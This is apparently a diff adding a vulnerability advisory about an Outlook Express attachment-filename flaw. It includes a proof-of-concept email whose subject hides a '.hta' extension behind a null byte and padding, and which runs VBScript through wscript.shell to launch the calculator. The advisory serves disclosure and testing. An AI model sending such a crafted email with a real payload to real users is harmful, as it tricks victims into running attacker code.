@@ -1,0 +1,48 @@
+source: http://www.securityfocus.com/bid/13837/info
+
+Microsoft Outlook Express is prone to an attachment file extension obfuscation vulnerability that may present a risk under certain configurations.
+
+The issue manifests due to Microsoft Outlook Express behavior while handling an 'EML' email attachment. If the email attachment does not have a filename, the subject of the attached email message is used as the filename.
+
+Reports indicate that this may be leveraged to make the attached email message executable. It is possible to cause a default file handler to be invoked to process the attached email message. Potentially allowing for code execution.
+
+This issue may lure a victim into a false sense of security and may result in inadvertent or unintentional execution of attacker-supplied code. 
+
+===>>> PoC - Start <<<===
+From:"Benjamin Tobias Franz"<0-1-2-3@gmx.de>
+To:You
+Subject:MSOE - Attachment Download Security Restriction Bypass
+Date:Wed, 1 Jun 2005
+Content-Type:multipart/mixed;boundary="btf"
+
+--btf
+Content-Type: text/plain;
+
+Open the attachment and you will see:
+MS OE will not show the correct warning message (for software)
+and not the type of the file.
+
+
+Regards,
+
+Benjamin Tobias Franz
+Germany
+--btf
+Content-Type:message/rfc822
+Content-Transfer-Encoding:quoted-printable
+
+<!--
+Subject:BTF's MSOE Attachment Download Security Restriction Bypass=
+.hta=00.btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf=
+btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf=
+btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf=
+btfbtf
+-->
+<title>YOU ARE VULNERABLE</title>
+<script language=3Dvbscript>set btf=3Dcreateobject("wscript.shell")=
+:btf.run("calc")</script><body style=3D"background-color:red;font-si=
+ze:40px;"><b>YOU ARE VULNERABLE!!!</b><br><br><br>Regards,<br><br>
+Benjamin Tobias Franz<br>Germany</body>
+--btf--
+
+===>>> PoC - End <<<=== 
